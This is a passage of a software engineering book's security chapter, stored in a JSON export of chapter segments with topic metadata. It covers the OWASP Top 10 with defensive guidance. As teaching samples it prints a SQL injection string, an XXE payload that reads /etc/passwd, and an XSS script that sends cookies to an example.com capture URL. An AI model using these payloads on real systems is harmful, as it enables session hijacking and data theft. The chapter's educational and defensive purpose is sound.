also need ways to intervene. Control systems and configuration services allow us to instruct running instances to change their behavior. Scheduling and deployment tools let us change the instance assortment dynamically as our internal and external environments shift.\n\nIn all these services, we need to understand that automation makes every- thing go faster. It also lacks human judgment, so when things go wrong, they go wrong very quickly. We need to build safety mechanisms into the automation itself.\n\nWe’ve almost finished our holistic journey through the layers of design for production. There’s just one last area to look into: security.\n\nreport erratum • discuss\n\nCHAPTER 11\n\nSecurity\n\nPoor security practices can damage your organization and many others. Your company may suffer direct losses from fraud or extortion. That damage gets multiplied by the cost of remediation, customer compensation, regulatory fines, and lost reputation. Individuals will lose their jobs, up to and including the CEO.1 In 2017, the “WannaCry” ransomware affected more than 70 countries. It hit office computers, subway displays, and hospitals. The UK’s National Health Service got hit particularly hard, causing X-ray sessions to be canceled, stroke centers to close, and surgeries to be postponed. It put lives at risk.2\n\nIn an epic game of one-upmanship, Equifax revealed in 2017 that 145.5 million US consumers’ identities had been stolen.3 And Yahoo! upped the ante in the same year when they announced that 3 billion Yahoo! accounts were stolen. We may have to discover alien life to get another order of magnitude increase.\n\nSystem breaches aren’t always about extracting data. Sometimes they are about implanting it, as in the case of false identities or shipping documents. That kind of effort may have contributed to California’s nut theft crisis in 2013.4\n\nSecurity must be baked in. It’s not a seasoning to sprinkle onto your system at the end. Even if your company has a dedicated security team, you aren’t off the hook. You’re still responsible to protect your customers and your company.\n\n1. 2.\n\nhttp://wapo.st/1juGxSu\n\nhttps://eandt.theiet.org/content/articles/2017/05/wannacry-and-ransomware-impact-on-patient-care-could-cause-\n\nfatalities\n\n3. 4.\n\nhttps://en.wikipedia.org/wiki/Equifax#May.E2.80.93July_2017_security_breach\n\nwww.outsideonline.com/2186526/nut-job\n\nreport erratum • discuss\n\nChapter 11. Security • 216\n\nIn this chapter, we’ll look at the “top ten” list of application vulnerabilities, as identified by the Open Web Application Security Project (OWASP). We’ll also consider data protection and integrity so that nobody loses their valuable nuts.\n\nThe OWASP Top 10\n\nSince 2001, the OWASP Foundation has catalogued application security incidents and vulnerabilities.5 Its member organizations contribute data from real attacks, so these are real lessons rather than “what-if-isms.” One way that OWASP promotes application security awareness is through its OWASP Top 10 list. It represents a consensus about the most critical web application security flaws, updated every three or four years. OWASP plans to release an updated and revised list in 2017. There’s still considerable debate, so the list here (based on “Release Candidate 1”) may not be the one that gets adopted. For that matter, it might actually turn out to be the 2018 update. It just goes to show that you can’t ever stop worrying about security.\n\nThis section will discuss the Top 10 in brief. It would still be good to go read the whole document. (Be warned, though; you may not want to put anything on the Net ever again!)\n\nInjection\n\n“Injection” is an attack on a parser or interpreter that relies on user-supplied input. The classic example is SQL injection, where ordinary user input is crafted to turn one SQL statement into more than one. This is the “Little Bobby Tables” attack.6 In that classic XKCD strip, a school administrator asks if the character’s son is really named “Robert’); DROP TABLE Students;- -”. While an odd moniker, Bobby Tables illustrates a typical SQL injection attack. If the application con- catenates strings to make its query, then the database will see an early sequence of '); to terminate whatever query the application really meant to do. The next thing is the destructive DROP TABLE statement that does the dirty deed. The double-hyphen at the end indicates a comment so the database will ignore the remainder of the input (whatever was left over from the original query).\n\nThere’s no excuse for SQL injections in this day and age. It happens when code bashes strings together to make queries. But every SQL library allows the use of placeholders in query strings. Don’t do this:\n\n// Vulnerable to injection String query = \"SELECT * FROM STUDENT WHERE NAME = '\" + name + \"';\"\n\n5. 6.\n\nwww.owasp.org\n\nhttp://bobby-tables.com\n\nreport erratum • discuss\n\nThe OWASP Top 10 • 217\n\nInstead do this:\n\n// Better String query = \"SELECT * FROM STUDENT WHERE NAME = ?;\" PreparedStatement stmt = connection.prepareStatement(query); stmt.setString(1, name); ResultSet results = stmt.executeQuery();\n\nFor more defenses, see the OWASP SQL Injection Prevention Cheat Sheet.7\n\nOther databases are also vulnerable to injection attacks. In general, if a service builds queries by bashing strings together and any of those strings come from a user, that service is vulnerable. Keep in mind that “comes from a user” doesn’t only mean the input arrived just now in an HTTP request. Data from a database may have originated from a user as well.\n\nAnother common vector for injection attacks is XML. XML may not be the cool kid on the block anymore, but there’s a lot of it flying around on the wires. One XML-based attack is the XML external entity (XXE) injection. You’re no doubt familiar with the built-in XML entities such as &amp; and &lt;. But did you know that XML allows any document to define new entities? Most of the time that’s just used to make shortcuts for commonly referenced tags or attributes. But documents can also specify “external entities” in the document type declaration (DTD). These act like “include” statements. An XML parser will replace occurrences of the external entity with whatever it receives from the associated URL. An “external entity” looks like this:\n\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>\n\nThis oddly shaped bit of XML first defines an inline DTD with the “DOCTYPE” processing instruction. The DTD defines two things. First, it says there’s a tag “foo” that can contain anything. Next it defines an entity “xxe” whose contents are found by reading the URL file:///etc/passwd.\n\nAn attacker would submit this document to an exposed API. Obviously it’s not going to do anything useful with that API. Instead the attacker hopes that the error response from the endpoint will contain the offending input, with the external entity expanded.\n\nMost XML parsers are vulnerable to XXE injection by default. You need to configure them to be safe. No, the answer is not to parse the XML yourself\n\n7.\n\nwww.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet\n\nreport erratum • discuss",
      "page_number": 216,
      "chapter_number": 27,
      "summary": "This chapter covers segment 27 (pages 216-223). Key topics include build, tools, and control. Control Plane • 208\n\nConsequently, a host of deployment tools represent “push” and “pull” methods.",
      "keywords": [
        "build",
        "instances",
        "Control",
        "API",
        "Control Plane",
        "service",
        "platform",
        "machines",
        "platform players",
        "admin API",
        "tools",
        "n’t",
        "report erratum",
        "deployment tools",
        "Command"
      ],
      "concepts": [
        "build",
        "tools",
        "control",
        "controlled",
        "instances",
        "needs",
        "machines",
        "software",
        "services",
        "api"
      ],
      "similar_chapters": [
        {
          "book": "Designing Machine Learning Systems An Iterative Process for Production-Ready Applications",
          "chapter": 42,
          "title": "Segment 42 (pages 359-366)",
          "relevance_score": 0.57,
          "method": "sentence_transformers"
        },
        {
          "book": "Microservices Up and Running",
          "chapter": 2,
          "title": "Segment 2 (pages 9-16)",
          "relevance_score": 0.57,
          "method": "sentence_transformers"
        },
        {
          "book": "Microservices Up and Running",
          "chapter": 19,
          "title": "Segment 19 (pages 193-200)",
          "relevance_score": 0.55,
          "method": "sentence_transformers"
        },
        {
          "book": "Microservices Up and Running",
          "chapter": 27,
          "title": "Segment 27 (pages 263-270)",
          "relevance_score": 0.55,
          "method": "sentence_transformers"
        },
        {
          "book": "Python Microservices Development",
          "chapter": 35,
          "title": "Segment 35 (pages 296-303)",
          "relevance_score": 0.54,
          "method": "sentence_transformers"
        }
      ]
    },
    {
      "number": 28,
      "title": "Segment 28 (pages 224-231)",
      "start_page": 224,
      "end_page": 231,
      "detection_method": "topic_boundary",
      "content": "Chapter 11. Security • 218\n\nwith regular expressions! Just use the OWASP XXE Prevention Cheat Sheet to configure your parser for safety.8\n\nSQL injection and XXE are just two of the many ways user input can corrupt your service. Format string attacks, “Eval injection,” XPATH injection...Injec- tion attacks have held their top spot on the OWASP Top 10 since 2010. Before that they were number two. Don’t let yourself fall prey.\n\nBroken Authentication and Session Management\n\nAuthentication and session management covers a myriad of problems. It can be as obvious as putting a session ID into URLs or as subtle as storing unsalted passwords in your user database. (If your user database stores passwords without hashing or encrypting them, please stop reading now and go fix that.) Let’s look at some of the top offenders.\n\nThe first place to look is with session identifiers in web front ends. At one time, it was common to use query parameters on URLs and hyperlinks to carry session IDs. Not only are those session IDs visible to every switch, router, and proxy server, they are also visible to humans. Anyone who copies and pastes a link from his or her browser inadvertently shares his or her session with email recipients and chat bots.\n\nAn electronics retailer once had a spectacular outage when a special-offer email went out to many thousands of people. The email included a deep link to the product page, including the marketer’s session ID. Thousands of random users tried to use that same session. The outage resulted from each of the front-end servers trying to take exclusive ownership of that session.\n\nThe general term for this is “session hijacking” (as opposed to truck hijacking). In the retailer’s case, it was self-inflicted. But any session ID in plain text can be sniffed and duplicated by an attacker. The attacker gains control of the user’s session. If we’re lucky, only that user is affected and may be the victim of identity theft or fraud. If we are unlucky, the hijacked session may belong to an administrator working through a web GUI.\n\nSession hijacking is easiest when the session ID is so visible. It can still happen, however, even if the session ID is embedded in a cookie. Sessions can also be compromised via cross-site scripting (XSS) attacks, which we’ll look at a little bit later.\n\nA variant of session hijacking is “session fixation.” An attacker goes to the vulnerable application and gets issued a valid session ID. The attacker then\n\n8.\n\nhttps://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet\n\nreport erratum • discuss\n\nThe OWASP Top 10 • 219\n\nsupplies the target with a link to the application with the attacker’s session ID in it. (It may be provided to the victim several ways, including client-side script or the META tag to set a cookie.) The receiving application accepts the session ID from the victim and generates a response within that session. From this point on, the victim uses a session that the attacker can access at any time. The attacker expects the user to authenticate the session, which grants both the victim and the attacker full access.\n\nIf your session IDs are generated by any kind of predictable process, then your service may also be vulnerable to a “session prediction” attack. This occurs when an attacker can guess or compute a session ID for a user. Any session IDs based on the user’s own data are definitely at risk. Sequential session IDs are the absolute worst choice here. Just because a session ID looks random doesn’t mean that it is random, though. It may be predictable but not sequential. Any algorithm used by the server that generates the ID is probably open source and available for the attacker to download too.\n\nOWASP suggests the following guidelines for handling session IDs:\n\nUse a long session ID with lots of entropy.\n\nGenerate session IDs using a pseudorandom number generator (PRNG) with good cryptographic properties. Your language’s built-in rand() function probably isn’t it.\n\nProtect against XSS to avoid script execution that would reveal session IDs.\n\nWhen a user authenticates, generate a fresh session ID. That way, if a session fixation attack occurs, the attacker will not have access to the user’s account.\n\nUse the session management features built into your platform. They’ve already been hardened against many of these attacks. But keep up-to- date with security patches and versions. Too many systems run outdated versions with known vulnerabilities.\n\nUse cookies to exchange session IDs. Do not accept session IDs via other mechanisms. Some servers will emit session IDs in cookies but still accept them via query parameters. Disable that.\n\nWhen it comes to credentials, the most common problem is still the simplest: credentials sent in the clear. This originates from two toxic development practices. First, TLS certificates have been hard to use and easy to install incorrectly. That means most developers have never dealt with certificates or certificate chains in a production server. There are too many formats and too\n\nreport erratum • discuss\n\nChapter 11. Security • 220\n\nmany “mysterious” problems. Second, most developer tools and runtimes leave it up to the user to configure a trust store. (Be honest, could you write a cURL command for a TLS-secured call to a development server using a self- signed certificate?) Consequently, we often write web services that use HTTP instead of HTTPS.\n\nHope is in the air, though. Let’s Encrypt has some promise to make certificates easier to acquire and use in web servers. Cloud and PaaS players are building certificate management and TLS into their platform.\n\nLarge enterprises may roll out a Kerberos-based system, bridged to their active directory services. If that sentence meant anything to you, then congratulations! You are in the top 10 percent of security-aware developers! (Have an almond! Unless you’re allergic, of course.) For the most part, one or two people will figure out a recipe to make this work in your world, and then everyone else will copy and paste the code that makes the security infrastructure happy.\n\n“Authentication” means we verify the identity of the caller. Is the caller who he or she claims to be? That may be a person in the case of a user-facing application. For an external API, it may be another company. Internal services need to authenticate their callers. In the old world, we used the “pie crust” defense. You had to authenticate to cross a boundary, but services inside the “pie” could call each other freely. Boundaries are much less clear today, so we need to think about authentication everywhere. Don’t trust calls based on their originating IP addresses, because those can be faked.\n\nLet’s start with the basics. Here are some do’s and don’ts:\n\nDon’t keep passwords in your database.\n\nNever email a password to a user as part of a “forgotten password” process.\n\nDo apply a strong hash algorithm to passwords. Use “salt,” which is some random data added to the password to make dictionary attacks harder.\n\nDo allow users to enter overly long passwords.\n\nDo allow users to paste passwords into GUIs.\n\nDo plan on rehashing passwords at some point in the future. We have to keep increasing the strength of our hash algorithms. Make sure you can change the salt, too.\n\nDon’t allow attackers to make unlimited authentication attempts.\n\nOne side note about the number of authentication attempts you allow: people instinctively want to limit this to three attempts before locking an account.\n\nreport erratum • discuss\n\nThe OWASP Top 10 • 221\n\nThe trouble is that most of us have multiple devices with applications that can automatically retry authentication several times. It’s not very friendly to lock out users because they changed their password via the web interface but your mobile app kept trying to log them in with an old password.\n\nAuthentication may be first-party or third-party. In first-party authentication, the authority (us) keeps a database of credentials. The principal (the caller who claims to have an identity) provides credentials that the authority checks against its database. If the credentials match, the authority accepts that identity for the principal.\n\nIn third-party authentication, the principal presents a “proof” that it acquired from some other authority. Our system can check that proof to verify that it could only have been issued by the authority. Of course, this relies on some exchange of secret information in advance that we can use to confirm the proof. For example, our service may have the public half of a keypair that the authority uses to sign its proofs. A second but equally important thing to check is that the proof wasn’t intercepted and used by an attacker. Kerberos, NTLM, and OAuth are all third-party authentication systems.\n\nCross-Site Scripting\n\nCross-site scripting (XSS) happens when a service renders a user’s input directly into HTML without applying input escaping. It’s related to injection attacks. Both take advantage of the fact that we represent structured data as sequences of ordinary characters by providing premature delimiters and unwanted commands. For example, suppose we have a service that echoes back the user’s “search” parameter in the results page. It has some server- side rendering code like this:\n\n// Don't do this. String queryBox = \"<input type='text' value='\" + request.getParameter(\"search\") + \"' />\";\n\n// XSS happens here.\n\nAn attacker can run a search with this nasty little query string (wrapped to fit the page):\n\n'><script>document.location='http://www.example.com/capture?id='+ document.cookie</script>'\n\nAfter the server inserts that string, the resulting HTML looks like this (wrapped to fit the page):\n\n<input type='text' value=''> <script>document.location='http://www.example.com/capture?id='+ document.cookie</script>'' />\n\nreport erratum • discuss\n\nChapter 11. Security • 222\n\nThis is malformed HTML to be sure, but browsers are pretty lenient about that. When the client’s browser hits the script tag in the middle, it makes a request over to www.example.com with the user’s cookie as a parameter, allowing the attacker to hijack the user’s session.\n\nThis isn’t just a problem with server-side rendering. Lots of front-end apps make service calls and put the content straight into the DOM without escaping. These clients are just as vulnerable to XSS.\n\nA whole class of injection attacks aim at administrator or customer service GUIs. These attacks work through the browser. For example, a customer may fill out a “contact us” form with a bunch of hostile data with embedded JavaScript. When a high-authorization user pulls up that record, the Java- Script executes on the administrator’s browser. It might be hours, days, or weeks later. Some injection attacks have targeted log viewers. These work by putting hostile data in log strings. If the log viewer doesn’t apply good HTML escaping, it will execute code with the privileges of the user running the viewer (often an admin).\n\nAutomated scanning tools will find XSS flaws quickly. They submit forms with quasi-random data to see when it gets echoed to an output page without escaping. Expect an exploit within milliseconds.\n\nXSS can be used to conscript your system into attacking others. The attacker injects script into your system, which then executes on your users’ browsers to attack a different party entirely. Herd immunity is vital to stopping XSS.\n\nThe bottom line is this: never trust input. Scrub it on the way in and escape it on the way out. Java developers should use OWASP’s Java Encoder Project.9 And everyone should read the XSS Prevention Cheat Sheet.10\n\nA secondary lesson is this: don’t build structured data by smashing strings together. Look for an HTML generation library that automatically escapes everything and forces you to ask nicely to do unsafe things.\n\nBroken Access Control\n\nBroken access control refers to application problems that allow attackers to access data they shouldn’t. This can include other users’ data or system- level data like password files.\n\n9. 10. www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet\n\nwww.owasp.org/index.php/OWASP_Java_Encoder_Project\n\nreport erratum • discuss\n\nThe OWASP Top 10 • 223\n\nOne of the common forms of broken access control is “direct object access.” This happens when a URL includes something like a database ID as a query parameter. An attacker sees the ID in the query parameter and starts probing for other numbers. Since database IDs are assigned sequentially, it’s easy for an attacker to scan for other interesting data. For example, suppose a ware- house management system uses the customer’s ID to display a report of shipments. An attacker can start trying other customer IDs to see what goods are en route.\n\nThe solution has two parts: reducing the value of URL probing and checking authorization to objects in the first place.\n\nDeter URL Probing\n\nWe can make it harder to find interesting values. First, don’t use database IDs in URLs. We can generate unique but non-sequential identifiers to use in URLs. In that case, an attacker can probe the ID space but will have low odds of finding interesting results.\n\nAnother approach is to use a generic URL that is session-sensitive. For instance, instead of http://www.example.com/users/1023, use http://www.example.com/users/me. An attacker may try a lot of values in place of “me” but won’t be able to see anyone else’s private data.\n\nYet another approach is to use a session-specific mapping from random IDs to real IDs. This uses more memory, but it avoids the extra storage needed for randomized IDs. When a user makes a request for http://www.example.com/pro- files/1990523, the service looks up that number in the session-scoped map. If it exists, the service can fetch the underlying object (probably from cache). If it doesn’t exist, then the service returns a 404. This prevents attackers from probing for other users’ data. One downside is that the service must populate all response URLs with randomly assigned identifiers. A second downside is that links will not persist across sessions. This violates REST principles.\n\nAuthorize Access to Objects\n\nThe underlying reason direct object access problems happen is that our ser- vices confuse “possesses a URL” with “allowed to access resource.” Callers may possess many URLs from sniffing, phishing, or probing that they should not be allowed to access.\n\nIf a resource should only be sent to authorized callers, your service must make that check on every request. You may think that a URL could only be generated by a secure service, but that’s never the case. URLs are just text strings, and anybody can create whatever URL they like!\n\nreport erratum • discuss\n\nChapter 11. Security • 224\n\nThere’s a subtle error that often causes information leakage here. Suppose your service responds with a “404 Not Found” when a caller requests a resource that doesn’t exist, but responds with a “403 Authentication Required” for a resource that exists but isn’t authorized. That means your service leaks information about what resources exist or not. That may not seem like much, but it could be. Suppose the resources in question are customers by ID. Then an attacker could find out how many customers you have by making requests for customer 1, 2, 3, and so on. When the response changes from 403 to 404, they’ve found the size of your customer base. It might be very interesting to see that number change from month to month.\n\nOr, an attacker could probe your login service with different email addresses harvested from the web. A 403 means “yes, that’s my customer,” where a 404 means “never heard of them.”\n\nRule of thumb: If a caller is not authorized to see the contents of a resource, it should be as if the resource doesn’t even exist.\n\nAnother kind of broken access control leads to directory traversal attacks. This happens whenever a caller provides input that’s used to construct a file name. The caller supplies a parameter with one or more ../ strings (for Unix systems) or ..\\ (for Windows.) The service concatenates that with some base directory and ends up opening a file outside the expected location (string concatenation again!). With just a few requests, a caller can find a way to the password file on the host.\n\nEven worse, when a request involves a file upload, the caller can overwrite any file the service is allowed to modify. (Yet another reason to not run as root!) Your application might think it’s saving the user’s profile picture, but it actually writes a malicious executable into the filesystem.\n\nThe only safe way to handle file uploads is to treat the client’s filename as an arbitrary string to store in a database field. Don’t build a path from the file- name in the request. Generate a unique, random key for the real filename and link it to the user-specified name in the database. That way, the names in the filesystem stay under your service’s control and don’t include external input as any part.\n\nDirectory traversals can be subtle and hard to scrub out of input. The entry for Common Weakness Enumeration 22 shows several failed attempts to protect against traversal.11 Fortunately, it also shows how to prevent it.\n\n11. http://cwe.mitre.org/data/definitions/22.html\n\nreport erratum • discuss\n\nThe OWASP Top 10 • 225\n\nSecurity Misconfiguration\n\nHow many times have you typed “admin/admin” as a login? It may seem ridiculous, but default passwords are a serious problem. Attackers have entered applications, network devices, and databases by using the default, out-of-the-box admin login. This is just one kind of security misconfiguration.\n\nSecurity misconfiguration usually takes the form of omission. Servers enable unneeded features by default. We forget (or don’t know) to disable them and thereby leave an unconfigured, unmonitored entry point open.\n\nAdmin consoles are a common source of problems. Seek them out and force good password hygiene. Never allow a default password on a production server. Cast a wary eye on containers, especially if you’re building on an image that includes applications. Base OS images shouldn’t have servers running, but common bundles include servers like Redis, Mongo, Postgres, ZooKeeper, and so on. These have their own authentication mechanisms and default admin passwords.\n\nThe whole world got a vivid wake-up call in the early days of 2017, when somewhere north of 20,000 MongoDB installations were taken hostage. The databases had default credentials and were exposed to the Internet. Attackers took the data, wiped the database out, and replaced it with a demand for bitcoin. (Note that MongoDB, the company, has a thorough guide for securing the database;12 it’s unfortunate that the default installation at the time was not secured.) Remember the install script is the first step in installation, not the last.\n\nAnother common security misconfiguration relates to servers listening too broadly. We first encountered this in Programming for Multiple Networks, on page 145. You can improve information security right away by splitting internal traffic onto its own NIC separate from public-facing traffic. Security profes- sionals talk about the “attack surface,” meaning the sum of all IP addresses, ports, and protocols reachable to attackers. Split those admin interfaces to reduce the attack surface. This is especially easy in cloud environments, where another interface is just an API call away.\n\nSome servers come with sample applications that have shockingly poor security protection and may be ages out of date. There’s never a reason to put a sample application into production. Nevertheless, it happens. Once there, the sample apps are never patched. They’re part of the exposed attack surface. Sample apps are well known and easy to find in the wild. It’s easy to build an attack for flaws in those sample apps.\n\n12. www.mongodb.com/blog/post/how-to-avoid-a-malicious-attack-that-ransoms-your-data\n\nreport erratum • discuss",
      "page_number": 224,
      "chapter_number": 28,
      "summary": "Security • 216\n\nIn this chapter, we’ll look at the “top ten” list of application vulnerabilities, as identified by the Open Web Application Security Project (OWASP) Key topics include session, sessions, and attacks.",
      "keywords": [
        "Session",
        "OWASP Top",
        "session IDs",
        "OWASP",
        "user",
        "OWASP SQL Injection",
        "attacker",
        "Injection",
        "SQL injection",
        "top",
        "IDs",
        "injection attacks",
        "n’t",
        "XML",
        "SQL Injection Prevention"
      ],
      "concepts": [
        "session",
        "sessions",
        "attacks",
        "user",
        "service",
        "data",
        "strings",
        "string",
        "authentication",
        "authenticate"
      ],
      "similar_chapters": [
        {
          "book": "AI Engineering Building Applications",
          "chapter": 23,
          "title": "Segment 23 (pages 457-476)",
          "relevance_score": 0.52,
          "method": "sentence_transformers"
        },
        {
          "book": "Building Microservices",
          "chapter": 9,
          "title": "Security",
          "relevance_score": 0.46,
          "method": "sentence_transformers"
        },
        {
          "book": "Python Architecture Patterns",
          "chapter": 1,
          "title": "[ 3 ]",
          "relevance_score": 0.46,
          "method": "sentence_transformers"
        },
        {
          "book": "Python Microservices Development",
          "chapter": 25,
          "title": "Segment 25 (pages 201-208)",
          "relevance_score": 0.46,
          "method": "sentence_transformers"
        },
        {
          "book": "Game Programming Gems 3",
          "chapter": 56,
          "title": "Segment 56 (pages 532-540)",
          "relevance_score": 0.44,
          "method": "sentence_transformers"
        }
      ]
    },
    {
      "number": 29,
      "title": "Segment 29 (pages 232-239)",
      "start_page": 232,
      "end_page": 239,
      "detection_method": "topic_boundary",
      "content": "Chapter 11. Security • 226\n\nFinally, make sure every administrator uses a personal account, not a group account. While you’re at it, go ahead and add some logging to those adminis- trative and internal calls. If nothing else, you’ll be one of the few people to witness a smiling auditor.\n\nSensitive Data Exposure\n\nThis is the big one. Credit cards (Equifax!). Medical records. Insurance files. Purchasing data. Emails (Yahoo!). All the valuable things people can steal from you or use against you. The stuff that makes for headlines and subpoe- nas. That’s what OWASP means by “sensitive data.” The “exposure” part is probably obvious.\n\nExposure doesn’t mean that a hacker broke your crypto. Hackers don’t attack your strong points. They look for cracks in your shell. It can be as simple as an employee’s stolen laptop with a database extract in a spreadsheet. Maybe your system uses TLS at the edge but REST over plain HTTP internally— another “pie crust.” An attacker can sniff the network to collect credentials and payload data.\n\nHere are some guidelines to help you avoid headlines:\n\nDon’t store sensitive information that you don’t need. In retail, use a\n\ncredit card tokenizer from your payment provider.\n\nUse HTTP Strict Transport Security. This is a step beyond HTTPS-first.\n\nIt prevents clients from negotiating their way to insecure protocols.\n\nStop using SHA-1. Just stop. It’s no longer adequate.\n\nNever store passwords in plain text. Read OWASP’s Password Storage Cheat Sheet for guidance on hash algorithms and good salting.13\n\nMake sure sensitive data is encrypted in the database. It’s a pain, but\n\nnecessary.\n\nDecrypt data based on the user’s authorization, not the server’s.\n\nIf you are in the AWS cloud, consider using AWS Key Management Service (KMS).14 KMS creates and manages master keys. Applications can request data encryption keys, which they use to encrypt or decrypt data. The data encryption keys are themselves encrypted with a “key encryption key.” It gets kind of recursive, but the point is that you don’t leave decryption keys laying\n\n13. www.owasp.org/index.php/Password_Storage_Cheat_Sheet 14. http://docs.aws.amazon.com/kms/latest/developerguide/concepts.html\n\nreport erratum • discuss\n\nThe OWASP Top 10 • 227\n\naround where an attacker could retrieve them. If you’re running on your own premises, consider HashiCorp’s Vault.15 It manages “secrets” a bit more broadly than KMS.\n\nRegardless of which tool you pick, don’t try to hold it at arm’s length. Use the tool fully as part of a holistic secure development process.\n\nInsufficient Attack Protection\n\nConsider a production service protected by a firewall. It should be safe from attackers. Sadly, that is not the case. We must always assume that attackers have unlimited access to other machines behind the firewall. They can make arbitrary requests. That includes well-formed requests for unauthorized data, and it includes malformed requests aimed at compro- mising the service itself.\n\nServices do not typically track illegitimate requests by their origin. They do not block callers that issue too many bad requests. That allows an attacking program to keep making calls, either to probe for weaknesses or extract data.\n\nYour service probably detects bad input and rejects it like a closed pistachio. That leaves the attacker free to keep issuing requests. The service should log bad requests by source principal. Log collection tools, which we covered in Logs and Stats, on page 204, can collate those requests to find patterns.\n\nIt’s probably not feasible to give every service a whitelist of allowed consumers. After all, we want consumers to be deployed on their own, without centralized control. We can, however, give a service a blacklist of disallowed consumers. This may be stored as a certificate revocation list (CRL) or by principal name in your authentication system (Active Directory name, for example).\n\n“API Gateways” are a useful defense here. An API gateway can block callers by their API key. It can also throttle their request rate. Normally, this helps preserve capacity. In the case of an attack, it slows the rate of data compro- mise, thereby limiting the damage.\n\nNetwork devices may help if your service is in a data center under your control. Application-layer firewalls (also called “layer 7” firewalls) can detect and block suspicious calls. They can also be loaded with signatures of well-known attacks to block probes.\n\n15. www.vaultproject.io\n\nreport erratum • discuss\n\nChapter 11. Security • 228\n\nCross-Site Request Forgery\n\nCross-site request forgery (CSRF) used to be a bigger issue than it is now. These days, most web frameworks automatically include defenses against it. But a lot of old applications are out there. Some are vulnerable targets, while others can be used as stooges.\n\nA CSRF attack starts on another site. An attacker uses a web page with JavaScript, CSS, or HTML that includes a link to your system. When the hapless user’s browser accesses your system, your system thinks it’s a valid request from that user. Boom, your user is roasted. Note that the user’s browser will send all the usual cookies, including session cookies. Just because the user appears to have a logged-in session doesn’t mean the request is intentional.\n\nThe first thing to do is make sure your site can’t be used to launch CSRF attacks. XSS is a common trap. If the attacker can supply input that you display without proper escaping, the attacker can trick people into viewing it through your site. Don’t be a part of it!\n\nSecond, make sure that requests with side effects—such as password changes, mailing address updates, or purchases—use anti-CSRF tokens. These are extra fields containing random data that your system emits when rendering a form. Your code expects get the same token back when the user submits the form. If the token is missing or doesn’t match, it means the request is bogus. Most frameworks today do this for you, but you might have to enable CSRF protection in your service’s configuration.\n\nYou can also tighten up your cookie policy with the relatively new “SameSite” attribute.16 A cookie with that attribute looks like this in a response header:\n\nSet-Cookie: SID=31d4d96e407aad42; SameSite=strict\n\nThe “SameSite” attribute causes the browser to send the cookie only if the document’s origin is the same as the target’s origin. That includes subdo- mains, so same-site cookies for “account.example.com” would not be sent to “images.example.com.” Not every browser supports same-site cookies as of June 2017. The Chrome family supports it on desktop and mobile. Opera does as well, but Firefox, Internet Explorer, and Edge do not. Keep an eye on the Can I Use... website to see when your supported browsers have this feature.17\n\n16. https://tools.ietf.org/html/draft-west-first-party-cookies-06 17. http://caniuse.com/#feat=same-site-cookie-attribute\n\nreport erratum • discuss\n\nThe OWASP Top 10 • 229\n\nSame-site cookies are not a zero-cost feature. In particular, they may require you to change your session management approach. A top-level navigation request (an in-bound link from another system) on a new page is not a same- site request when the cookie says “strict.”\n\nThe RFC recommends using a pair of cookies:\n\nA session “read” cookie: not same-site. Allows HTTP GET requests. • A session “write” cookie: same-site strict. Required for state-changing requests.\n\nAs with the other Top 10 items, OWASP has a cheat sheet for CSRF prevention.18\n\nUsing Components with Known Vulnerabilities\n\nIs there anyone out there running Struts 2 between version 2.3.0 and 2.3.32 or 2.5.x before 2.5.10.1? Beware of an attack that allows remote code execu- tion.19 That’s what got Equifax. Once you know that vulnerability exists, it should just be a matter of updating to a patched version and redeploying. But who keeps track of the patch level of all their dependencies? Most devel- opers don’t even know what all is in their dependency tree.\n\nSadly, most successful attacks are not the exciting “zero day, rush to patch before they get it” kind of thing that makes those cringe-worthy scenes in big budget thrillers. Most attacks are mundane. A workbench-style tool probes IP addresses for hundreds of vulnerabilities, some of them truly ancient. The attacker may just collect an inventory of targets and weaknesses, or they may run automated exploits to add the machine to a growing collection of compro- mised minions.\n\nIt’s important to keep applications up-to-date. That means coming to grips with your dependency tree. Use your build tool to extract a report of all the artifacts that went into your build. (Don’t forget about plugins to the build tool itself! They can also have vulnerabilities.) Keep that report someplace and check it once a week against the latest CVEs. Better yet, use a build tool plugin that automatically breaks the build if there’s a CVE against any of your dependencies.20 If that’s too much work, you can sign up for a commercial service like VersionEye.21\n\n18. www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet 19. https://nvd.nist.gov/vuln/detail/CVE-2017-5638 20. https://www.owasp.org/index.php/OWASP_Dependency_Check 21. https://www.versioneye.com/\n\nreport erratum • discuss\n\nChapter 11. Security • 230\n\nMany vulnerabilities never get published, though. Some are discussed on the project’s mailing list or issue tracker but do not get CVEs, so you should keep an eye on those as well.\n\nUnderprotected APIs\n\nThe final entry in the Top 10 is also a newcomer to the list. The rise of REST and rich clients elevated APIs to a primary architectural concern. For some companies, the API is their entire product. It’s essential to make sure that APIs are not misused.\n\nSecurity scanners have been slow to tackle APIs. In part, this is because there’s no standard metadata description about how an API should work. That makes it hard for a testing tool to glean any information about it. After all, if you can’t tell how it should work, how do you know when it’s broken?\n\nTo make things even harder, APIs are meant to be used by programs. Well, attack tools are also programs. If an attack tool presents the right credentials and access tokens, it’s indistinguishable from a legitimate user.\n\nThere are several keys to defense.\n\nThe first is a kind of bulkheading (see Bulkheads, on page 98). If one cus- tomer’s credentials are stolen, that’s bad. If the attacker can use those to get other customers’ data, that’s catastrophic. APIs must ensure that malicious requests cannot access data the original user would not be able to see. That sounds easy, but it’s trickier than you might think. For instance, your API absolutely cannot use hyperlinks as a security measure. In other words, your API may generate a link to a resource as a way to say “access is granted” to that resource. But nothing says the client is only going to hit that link. It may issue 10,000 requests to figure out your URL templating pattern and then generate requests for every possible user ID. The upshot is that the API has to authorize the link on the way out and then reauthorize the request that comes back in.\n\nSecond, your API should use the most secure means available to communicate. For public-facing APIs this means TLS. Be sure to configure it to reject protocol downgrades. Also keep your root certificate authority (CA) files up-to-date. Bad actors compromise certificates way more often than you might think. For business-to-business APIs, you might want to use bidirectional certificates so each end verifies the other.\n\nThird, whatever data parser you use—be it JSON, YAML, XML, Transit, EDN, Avro, Protobufs, or Morse code—make sure the parser is hardened against\n\nreport erratum • discuss\n\nThe Principle of Least Privilege • 231\n\nmalicious input. Use a generative testing library to feed it tons and tons of bogus input to make sure it rejects the input or fails in a safe way. Fuzz- testing APIs is especially important because, by their nature, they respond as quickly as possible to as many requests as 